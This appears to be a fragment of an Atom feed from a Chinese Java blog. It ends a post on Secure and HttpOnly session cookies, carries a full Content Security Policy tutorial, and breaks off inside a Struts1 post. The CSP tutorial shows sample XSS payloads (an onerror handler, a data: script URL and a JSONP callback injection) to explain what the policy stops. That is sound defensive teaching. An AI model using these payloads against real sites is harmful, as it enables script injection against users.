class="name">filter-class</span>&gt;</span>com.test.CookieFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cookieFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookieFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,  </span></span></span><br><span class="line"><span class="function"><span class="params">            FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;  </span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) request;  </span><br><span class="line">        HttpServletResponse resp = (HttpServletResponse) response;  </span><br><span class="line">  </span><br><span class="line">        Cookie[] cookies = req.getCookies();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123;  </span><br><span class="line">                Cookie cookie = cookies[<span class="number">0</span>];  </span><br><span class="line">                <span class="keyword">if</span> (cookie != <span class="keyword">null</span>) &#123;  </span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    cookie.setMaxAge(3600); </span></span><br><span class="line"><span class="comment">                    cookie.setSecure(true); </span></span><br><span class="line"><span class="comment">                    resp.addCookie(cookie);</span></span><br><span class="line"><span class="comment">                    */</span>  </span><br><span class="line">                      </span><br><span class="line">                    <span class="comment">//Servlet 2.5不支持在Cookie上直接设置HttpOnly属性  </span></span><br><span class="line">                    String value = cookie.getValue();  </span><br><span class="line">                    StringBuilder builder = <span class="keyword">new</span> StringBuilder();  </span><br><span class="line">                    builder.append(<span class="string">"JSESSIONID="</span> + value + <span class="string">"; "</span>);  </span><br><span class="line">                    builder.append(<span class="string">"Secure; "</span>);  </span><br><span class="line">                    builder.append(<span class="string">"HttpOnly; "</span>);  </span><br><span class="line">                    Calendar cal = Calendar.getInstance();  </span><br><span class="line">                    cal.add(Calendar.HOUR, <span class="number">1</span>);  </span><br><span class="line">                    Date date = cal.getTime();  </span><br><span class="line">                    Locale locale = Locale.CHINA;  </span><br><span class="line">                    SimpleDateFormat sdf =   </span><br><span class="line">                            <span class="keyword">new</span> SimpleDateFormat(<span class="string">"dd-MM-yyyy HH:mm:ss"</span>,locale);  </span><br><span class="line">                    builder.append(<span class="string">"Expires="</span> + sdf.format(date));  </span><br><span class="line">                    resp.setHeader(<span class="string">"Set-Cookie"</span>, builder.toString());  </span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    String sessionid = request.getSession().getId();</span></span><br><span class="line"><span class="comment">                    response.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid + "; secure");</span></span><br><span class="line"><span class="comment">                    */</span> </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        chain.doFilter(req, resp);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在WAS中设置cookie-secure"><a href="#在WAS中设置cookie-secure" class="headerlink" title="在WAS中设置cookie secure"></a>在WAS中设置cookie secure</h2><p>在IBM Webphere ,WAS中设置cookie secure，可以考虑修改WAS配置。</p><h3 id="To-set-Secure-flag-to-JSESSIONID-cookie-same-for-WebSphere-7-x-and-8-x"><a href="#To-set-Secure-flag-to-JSESSIONID-cookie-same-for-WebSphere-7-x-and-8-x" class="headerlink" title="To set Secure flag to JSESSIONID cookie (same for WebSphere 7.x and 8.x)"></a>To set Secure flag to JSESSIONID cookie (same for WebSphere 7.x and 8.x)</h3><pre><code>1. log in log in WebSphere admin console2. Navigate to Server &gt; Server types &gt; WebSphere application servers3. Click on server name (default is server1)4. Click on link Web Container settings &gt; Web Container5. Click on link Session Management6. Click on link Enable Cookies. This bit a litle bit confusing, you have to click on text not on the check box7. select option (check box) Restrict cookies to HTTPS sessions8. Save changes</code></pre><h3 id="To-set-HttpOnly-flag-in-WebSphere-8-x-to-JSESSIONID-cookie"><a href="#To-set-HttpOnly-flag-in-WebSphere-8-x-to-JSESSIONID-cookie" class="headerlink" title="To set HttpOnly flag in WebSphere 8.x to JSESSIONID cookie"></a>To set HttpOnly flag in WebSphere 8.x to JSESSIONID cookie</h3><pre><code>1. log in log in WebSphere admin console2. Navigate to Server &gt; Server types &gt; WebSphere application servers3. Click on server name (default is server1)4. Click on link Web Container settings &gt; Web Container5. Click on link Session Management6. Click on link Enable Cookies. This bit a litle bit confusing, you have to click on text not on the check box7. select option (check box) Set session cookies to HTTPOnly to help prevent cross-site scripting attacks8. Save changes</code></pre><h3 id="To-set-HttpOnly-flag-in-WebSphere-7-x-to-JSESSIONID-cookie"><a href="#To-set-HttpOnly-flag-in-WebSphere-7-x-to-JSESSIONID-cookie" class="headerlink" title="To set HttpOnly flag in WebSphere 7.x to JSESSIONID cookie"></a>To set HttpOnly flag in WebSphere 7.x to JSESSIONID cookie</h3><pre><code>1. log in log in WebSphere admin console2. Navigate to Server &gt; Server types &gt; WebSphere application servers3. Click on server name (default is server1)4. Click on link Web Container settings &gt; Web Container5. Click on link Custom Proprties6. Click on button New7. Enter name: com.ibm.ws.webcontainer.httpOnlyCookies value:* (HttpOnly will be set on all cookies not only JSESSIONID)8. Click on OK button9. Save changes</code></pre>]]></content>
    
    <summary type="html">
    
      1. 在Filter或其他位置中设置reponse.setHeader(&quot;Set-Cookie&quot;,cookieValue)。2. 在Servlet 3.0及以上中在web.xml中配置session-config中cookie-config的属性。
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
      <category term="安全" scheme="https://blog.yanzhe.tk/tags/security/"/>
    
      <category term="AppScan" scheme="https://blog.yanzhe.tk/tags/appscan/"/>
    
  </entry>
  
  <entry>
    <title>Content Security Policy 入门教程</title>
    <link href="https://blog.yanzhe.tk/2017/02/27/content-security-policy/"/>
    <id>https://blog.yanzhe.tk/2017/02/27/content-security-policy/</id>
    <published>2017-02-27T03:14:31.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<p>跨域脚本攻击 XSS(Cross Site Scripting) 是最常见、危害最大的网页安全漏洞。</p><p>为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？</p><p>这就是”网页安全政策”（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。<br>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。<br><img data-src="Content-Security-Policy-Example.jpg" alt="CSP示例"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'self'</span>; object-src <span class="string">'none'</span>;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><ul><li>脚本：只信任当前域名</li><li><object>标签：不信任任何URL，即不加载任何资源</object></li><li>样式表：只信任cdn.example.org和third-party.org</li><li>框架（frame）：必须使用HTTPS协议加载</li><li>其他资源：没有限制</li></ul><p>启用后，不符合 CSP 的外部资源就会被阻止加载。<br>Chrome 的报错信息。</p><p><img data-src="CSP-chrome-err.png" alt="CSP Chrome 报错信息"></p><p>Firefox 的报错信息。</p><p><img data-src="CSP-firefox-err.png" alt="CSP Firefox 报错信息"></p><h2 id="限制选项"><a href="#限制选项" class="headerlink" title="限制选项"></a>限制选项</h2><p>CSP 提供了很多限制选项，涉及安全的各个方面。</p><h3 id="资源加载限制"><a href="#资源加载限制" class="headerlink" title="资源加载限制"></a>资源加载限制</h3><p>以下选项限制各类资源的加载。</p><ul><li>script-src：外部脚本</li><li>style-src：样式表</li><li>img-src：图像</li><li>media-src：媒体文件（音频和视频）</li><li>font-src：字体文件</li><li>object-src：插件（比如 Flash）</li><li>child-src：框架</li><li>frame-ancestors：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）</applet></iframe></li><li>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li><li>worker-src：worker脚本</li><li>manifest-src：manifest 文件</li></ul><h3 id="defualt-src"><a href="#defualt-src" class="headerlink" title="defualt-src"></a>defualt-src</h3><p><code>default-src</code>用来设置上面各个选项的默认值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span></span><br></pre></td></tr></table></figure><p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。<br>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p><h3 id="URL限制"><a href="#URL限制" class="headerlink" title="URL限制"></a>URL限制</h3><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p><ul><li>frame-ancestors：限制嵌入框架的网页</li><li>base-uri：限制&lt;base#href&gt;</li><li>form-action：限制&lt;form#action&gt;</li></ul><h3 id="其他限制"><a href="#其他限制" class="headerlink" title="其他限制"></a>其他限制</h3><p>其他一些安全相关的功能，也放在了 CSP 里面。</p><ul><li>block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li><li>upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li><li>plugin-types：限制可以使用的插件格式</li><li>sandbox：浏览器行为的限制，比如不能有弹出窗口等。</li></ul><h3 id="report-uri"><a href="#report-uri" class="headerlink" title="report-uri"></a>report-uri</h3><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span>; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure><p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。<br>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"csp-report"</span>: &#123;</span><br><span class="line">    <span class="attr">"document-uri"</span>: <span class="string">"http://example.org/page.html"</span>,</span><br><span class="line">    <span class="attr">"referrer"</span>: <span class="string">"http://evil.example.com/"</span>,</span><br><span class="line">    <span class="attr">"blocked-uri"</span>: <span class="string">"http://evil.example.com/evil.js"</span>,</span><br><span class="line">    <span class="attr">"violated-directive"</span>: <span class="string">"script-src 'self' https://apis.google.com"</span>,</span><br><span class="line">    <span class="attr">"original-policy"</span>: <span class="string">"script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="CSP-report-uri.png" alt="CSP report uri"></p><h2 id="Content-Security-Policy-Report-Only"><a href="#Content-Security-Policy-Report-Only" class="headerlink" title="Content-Security-Policy-Report-Only"></a>Content-Security-Policy-Report-Only</h2><p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。<br>它必须与<code>report-uri</code>选项配合使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy-Report-Only: <span class="keyword">default</span>-src <span class="string">'self'</span>; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure><h2 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a>选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p><ul><li>主机名：example.org，<a href="https://example.com:443">https://example.com:443</a></li><li>路径名：example.org/resources/js/</li><li>通配符：<em>.example.org，</em>://<em>.example.com:</em>（表示任意协议、任意子域名、任意端口）</li><li>协议名：https:、data:</li><li>关键字’self’：当前域名，需要加引号</li><li>关键字’none’：禁止加载任何外部资源，需要加引号</li></ul><p>多个值也可以并列，用空格分隔。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'self'</span> https:<span class="comment">//apis.google.com</span></span><br></pre></td></tr></table></figure><p>如果同一个限制选项使用多次，只有第一次会生效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com; script-src https://host2.com</span></span><br><span class="line"></span><br><span class="line"># 正确的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com https://host2.com</span></span><br></pre></td></tr></table></figure><p>如果不设置某个限制选项，就是默认允许任何值。</p><h2 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a>script-src 的特殊值</h2><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p><ul><li>‘unsafe-inline’：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</li><li>unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</li><li>nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li><li>hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li></ul><p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'</span></span><br></pre></td></tr></table></figure><p>页面内嵌脚本，必须有这个token才能执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">EDNnf03nceIOfn39fn3e9h3sdfa</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// some code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='</span></span><br></pre></td></tr></table></figure><p>下面的代码就会允许执行，因为hash值相符。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Hello, world.'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。<br>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><h3 id="script-src和object-src是必设的，除非设置了default-src。"><a href="#script-src和object-src是必设的，除非设置了default-src。" class="headerlink" title="script-src和object-src是必设的，除非设置了default-src。"></a><code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</h3><p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p><h3 id="script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data-URL。"><a href="#script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data-URL。" class="headerlink" title="script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。"></a><code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data</code>:URL。</h3><p>下面是两个恶意攻击的例子。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"evil()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"data:text/javascript,evil()"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="必须特别注意-JSONP-的回调函数。"><a href="#必须特别注意-JSONP-的回调函数。" class="headerlink" title="必须特别注意 JSONP 的回调函数。"></a>必须特别注意 JSONP 的回调函数。</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">"/path/jsonp?callback=alert(document.domain)//"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p><p><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">原文链接-阮一峰</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跨域脚本攻击 XSS(Cross Site Scripting) 是最常见、危害最大的网页安全漏洞。&lt;/p&gt;&lt;p&gt;为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？&lt;/p&gt;&lt;p&gt;这就是”网页安全政策”（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="安全" scheme="https://blog.yanzhe.tk/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>filter中复制request的inputStream，多次取流</title>
    <link href="https://blog.yanzhe.tk/2016/10/26/filter-copy-request-inputStream/"/>
    <id>https://blog.yanzhe.tk/2016/10/26/filter-copy-request-inputStream/</id>
    <published>2016-10-26T08:11:44.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前期在struts1中尝试"><a href="#前期在struts1中尝试" class="headerlink" title="前期在struts1中尝试"></a>前期在struts1中尝试</h2><p>有个项目中使用的是Struts1，想着写个自己的ActionServlet和ReqeustProcessor，将其中的MultipartRequestWrapper换成自己实现的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yz.testweb.common.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts.upload.MultipartRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.struts.DelegatingRequestProcessor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">YZDelegatingRequestProcessor</span> <span class="keyword">extends</span> <span class="title">DelegatingRequestProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> HttpServletRequest <span class="title">processMultipart</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"POST"</span>.equalsIgnoreCase(request.getMethod())) &#123;</span><br><span class="line">            <span class="keyword">return</span> (request);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        String contentType = request.getContentType();</span><br><span class="line">        <span class="keyword">if</span> ((contentType != <span class="keyword">null</span>) &amp;&amp;</span><br><span class="line">            contentType.startsWith(<span class="string">"multipart/form-data"</span>)) &#123;</span><br><span class="line">                 YZMultipartRequestWrapper wrapper = (YZMultipartRequestWrapper)(request);</span><br><span class="line">            <span class="keyword">return</span> (wrapper);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doForward</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            String uri,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// Unwrap the multipart request, if there is one.</span></span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> MultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (request <span class="keyword">instanceof</span> YZMultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            RequestDispatcher rd = getServletContext().getRequestDispatcher(uri);</span><br><span class="line">            <span class="keyword">if</span> (rd == <span class="keyword">null</span>) &#123;</span><br><span class="line">                response.sendError(</span><br><span class="line">                    HttpServletResponse.SC_INTERNAL_SERVER_ERROR,</span><br><span class="line">                    getInternal().getMessage(<span class="string">"requestDispatcher"</span>, uri));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            rd.forward(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doInclude</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            String uri,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// Unwrap the multipart request, if there is one.</span></span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> MultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (request <span class="keyword">instanceof</span> YZMultipartRequestWrapper) &#123;</span><br><span class="line">                request = ((YZMultipartRequestWrapper) request).getRequest();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            RequestDispatcher rd = getServletContext().getRequestDispatcher(uri);</span><br><span class="line">            <span class="keyword">if</span> (rd == <span class="keyword">null</span>) &#123;</span><br><span class="line">                response.sendError(</span><br><span class="line">                    HttpServletResponse.SC_INTERNAL_SERVER_ERROR,</span><br><span class="line">                    getInternal().getMessage(<span class="string">"requestDispatcher"</span>, uri));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            rd.include(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在struts-config中需要将processorClass换成自己实现的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">controller</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set-property</span> <span class="attr">property</span>=<span class="string">"processorClass"</span> <span class="attr">value</span>=<span class="string">"com.yz.testweb.common.web.YZDelegatingRequestProcessor"</span> /&gt;</span></span><br><span 